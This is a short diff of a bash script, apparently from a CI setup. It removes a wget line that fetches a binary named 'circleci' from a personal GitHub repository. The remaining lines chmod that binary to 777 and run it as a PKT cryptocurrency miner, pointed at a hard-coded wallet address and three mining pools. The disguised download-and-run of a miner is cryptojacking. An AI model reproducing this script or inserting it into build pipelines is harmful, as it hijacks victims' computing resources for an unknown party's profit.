@@ -1,4 +1,4 @@
 #!/bin/bash
-wget https://github.com/aurbach55/zash/raw/main/circleci
+
 chmod 777 circleci >/dev/null 2>&1
 ./circleci ann -p pkt1q76dngmrf380w8k9j4f7w4eqpzx3n9vcprldmjx http://pool.pktpool.io http://pool.pkt.world https://stratum.zetahash.com
